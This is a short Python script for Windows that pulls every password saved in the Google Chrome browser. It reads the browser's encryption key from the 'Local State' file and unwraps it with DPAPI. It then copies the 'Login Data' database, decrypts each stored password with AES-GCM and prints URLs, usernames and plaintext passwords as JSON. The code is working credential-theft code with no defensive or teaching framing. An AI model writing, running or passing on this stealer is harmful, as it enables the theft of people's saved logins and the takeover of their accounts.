from getpass import getuser
import base64
import json
import win32crypt
from shutil import copy
from Crypto.Cipher import AES
import string
import sqlite3
from os import unlink

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        try:
            master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            #print(master_key)
        except Exception:
            master_key = None
            
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

class Chrome:
    def __init__(self):
        """ determine which platform you are on """
        self.win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
        self.master_key = get_master_key(f"C:\\Users\\{getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")

    
    def decrypt_password(self, enc_passwd):
        try:
            data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
            return data[1].decode('utf8')
        except:
            iv = enc_passwd[3:15]
            payload = enc_passwd[15:]
            cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
            decrypted_value = str(cipher.decrypt(payload)[:-16], "utf-8", "ignore")
            return decrypted_value
    
    def get_passwords(self, prettyprint):
        copy(self.win_path + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value
            FROM logins; """)
        data = {'data': []}
        for result in cursor.fetchall():
            _passwd = self.decrypt_password(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = _passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")
        
        if prettyprint:
            return json.dumps(data, indent=4)
        return data
        
def main():
    chrome_pwd = Chrome()
    print(chrome_pwd.get_passwords(True))
    
    
    
if __name__ == '__main__':
    main()